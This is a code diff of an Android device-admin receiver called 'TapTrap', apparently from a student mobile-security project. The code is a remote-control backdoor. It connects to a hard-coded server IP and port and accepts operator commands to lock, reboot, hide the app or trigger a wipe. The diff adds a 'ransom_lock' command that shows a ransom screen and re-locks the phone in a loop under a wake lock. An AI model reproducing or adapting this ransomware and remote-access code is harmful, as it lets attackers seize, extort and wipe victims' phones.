@@ -1,4 +1,7 @@
 package com.example.inf2007_mad_j1847.test;
+//import static com.example.inf2007_mad_j1847.test.Ran_warnKt.showRansomDialog;
+
+import android.app.AlertDialog;
 import android.app.admin.DeviceAdminReceiver;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
@@ -6,11 +9,22 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
+import android.graphics.Color;
+import android.graphics.drawable.ColorDrawable;
 import android.os.Build;
+import android.os.Handler;
+import android.os.Looper;
+import android.os.PowerManager;
 import android.util.Log;
+import android.view.Gravity;
+import android.view.WindowManager;
+import android.widget.TextView;
+
 import java.io.IOException;
 import java.net.Socket;
 import java.util.List;
+import java.util.concurrent.atomic.AtomicBoolean;
+
 
 import androidx.camera.core.Camera;
 
@@ -19,6 +33,12 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
     private static final String TAG = "TapTrap-Admin";
     private static final String SERVER_IP = "20.2.66.175";
     private static final int SERVER_PORT = 9999;
+
+
+    // Lock control variables
+    private static AtomicBoolean isContinuousLockActive = new AtomicBoolean(false);
+    private static Thread continuousLockThread = null;
+    private static PowerManager.WakeLock wakeLock = null;
     @Override
     public void onEnabled(Context context, Intent intent) {
         super.onEnabled(context, intent);
@@ -54,8 +74,6 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
                 writer.println("🔥 TapTrap shell connected!");
                 writer.println("Available commands:");
                 writer.println("  lock        - Lock the device");
-                writer.println("  cam_off (no use?)    - Disable camera");
-                writer.println("  cam_on (no use?)     - Enable camera");
                 writer.println("  whoami      - Show app user info");
                 writer.println("  device_info - Show device details");
                 writer.println("  battery     - Show battery status");
@@ -64,9 +82,12 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
                 writer.println("  hide_app (no use?)    - Hide app from launcher");
                 writer.println("  show_app (no use?)    - Show app in launcher");
                 writer.println("  reboot (not working on emulator)     - Reboot device");
+                writer.println("  ransom_lock - set max idle time lock");
+                writer.println("  ransom_end ");
                 writer.println("  exit        - Close connection");
                 writer.println("  wipe  (not working on emulator)      - Factory reset device (physical only)");
-                writer.println("  ransom_lock - set max idle time lock");
+
+
 
                 writer.println("----------------------------------");
 
@@ -100,13 +121,7 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
 
                 return "✅ Device locked!";
 
-            case "cam_off":
-                disableCamera(context);
-                return "✅ Camera disabled!";
 
-            case "cam_on":
-                enableCamera(context);
-                return "✅ Camera enabled!";
 
             case "whoami":
                 return "User: " + android.os.Process.myUid() +
@@ -143,12 +158,19 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
                 return "👋 Closing connection...";
 
             case "wipe":
-//                wipeDevice(context);
+
                 setMaxFailedAttempts(context, 1);
             return "✅ Wiping device...";
 
+
+
             case "ransom_lock":
-                setMaxLockTime(context);
+                showRansomDialog(context);
+                startContinuousLock(context);
+                return "✅ Device locked!";
+
+            case "ransom_end":
+                stopContinuousLock();
                 return "✅ Device locked!";
 
             default:
@@ -308,38 +330,6 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
 
     }
 
-    /**
-     * 2. Disable camera
-     */
-    public void disableCamera(Context context) {
-        try {
-            DevicePolicyManager dpm = getDpm(context);
-            ComponentName admin = getAdmin(context);
-
-            Log.d(TAG, " Disabling camera");
-            dpm.setCameraDisabled(admin, true);
-            Log.d(TAG, " end of Disabling camera");
-
-        }catch (Exception e) {
-            Log.d(TAG, "error disabling camera: " + e.getMessage());
-        }
-
-
-
-    }
-
-    /**
-     * 3. Enable camera
-     */
-    public void enableCamera(Context context) {
-        DevicePolicyManager dpm = getDpm(context);
-        ComponentName admin = getAdmin(context);
-
-        Log.d(TAG, " Enabling camera");
-        dpm.setCameraDisabled(admin, false);
-
-    }
-
 
     private void setMaxFailedAttempts(Context context, int attempts) {
         try {
@@ -367,19 +357,133 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
         }
     }
 
-    public String setMaxLockTime(Context context) {
+    public String setRansomLock(Context context) {
         DevicePolicyManager dpm = (DevicePolicyManager)
                 context.getSystemService(Context.DEVICE_POLICY_SERVICE);
-        ComponentName admin = new ComponentName(context, AppDeviceAdminReceiver.class);
 
-        // Set to 1 second
-        dpm.setMaximumTimeToLock(admin, 500L);
 
-        // Verify
-        long current = dpm.getMaximumTimeToLock(admin);
-        return "✅ Lock timeout set to " + (current/1000) + " seconds";
+        while (true) {
+            Log.d(TAG, " Locking device now");
+            dpm.lockNow();
+            // Optional: add a small delay to prevent overwhelming the system
+            try {
+                Thread.sleep(100); // 100ms delay
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+        }
+
+
     }
 
+
+
+    public void startContinuousLock(final Context context) {
+        if (isContinuousLockActive.get()) {
+            Log.d(TAG, "⚠️ Already locking");
+            return;
+        }
+
+        // Acquire wake lock
+        try {
+            PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
+            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
+                    "TapTrap:LockWakeLock");
+            wakeLock.acquire(10*60*1000L);
+            Log.d(TAG, "✅ WakeLock acquired");
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to acquire WakeLock: " + e.getMessage());
+            // Continue anyway - might still work
+        }
+
+        isContinuousLockActive.set(true);
+
+        continuousLockThread = new Thread(() -> {
+            DevicePolicyManager dpm = (DevicePolicyManager)
+                    context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+
+            Log.d(TAG, "▶️ INFINITE LOCK STARTED - Phone will keep locking!");
+            Log.d(TAG, "📊 Locking every 100ms (10 times/second)");
+
+            int lockCount = 0;
+            long startTime = System.currentTimeMillis();
+
+            while (isContinuousLockActive.get()) {
+                try {
+                    dpm.lockNow();
+                    lockCount++;
+
+                    // Log every second (every 10 locks at 100ms)
+                    if (lockCount % 10 == 0) {
+                        long runningTime = (System.currentTimeMillis() - startTime) / 1000;
+                        Log.d(TAG, "🔒 Active for " + runningTime + "s - Lock #" + lockCount);
+                    }
+
+                    Thread.sleep(5000);
+
+                } catch (InterruptedException e) {
+                    Log.d(TAG, "⏹️ Lock thread interrupted");
+                    break;
+                } catch (SecurityException e) {
+                    Log.e(TAG, "❌ Security error - device admin probably disabled");
+                    Log.e(TAG, "Stopping lock automatically");
+                    isContinuousLockActive.set(false);
+                    break;
+                } catch (Exception e) {
+                    Log.e(TAG, "❌ Unexpected error: " + e.getMessage());
+                    // Try to continue
+                }
+            }
+
+            // Cleanup
+            if (wakeLock != null && wakeLock.isHeld()) {
+                wakeLock.release();
+                Log.d(TAG, "✅ WakeLock released");
+            }
+
+            long totalTime = (System.currentTimeMillis() - startTime) / 1000;
+            Log.d(TAG, "⏹️ LOCKING STOPPED after " + totalTime + " seconds and " + lockCount + " locks");
+        });
+
+        continuousLockThread.start();
+    }
+
+    /**
+     * STOP continuous locking (OFF)
+     */
+    public void stopContinuousLock() {
+        if (isContinuousLockActive.get()) {
+            isContinuousLockActive.set(false);
+
+            if (continuousLockThread != null) {
+                continuousLockThread.interrupt();
+                try {
+                    continuousLockThread.join(2000); // Wait up to 2 seconds
+                } catch (InterruptedException e) {
+                    Log.e(TAG, "Interrupted while joining thread");
+                }
+                continuousLockThread = null;
+            }
+
+            // Release wake lock
+            if (wakeLock != null && wakeLock.isHeld()) {
+                wakeLock.release();
+                wakeLock = null;
+            }
+
+            Log.d(TAG, "⏹️ Continuous locking STOPPED (OFF)");
+        } else {
+            Log.d(TAG, "⚠️ Continuous locking was not active");
+        }
+    }
+
+
+    public void showRansomDialog(Context context) {
+        Intent intent = new Intent(context, RansomActivity.class);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+
+        context.startActivity(intent);
+    }
 
 
 
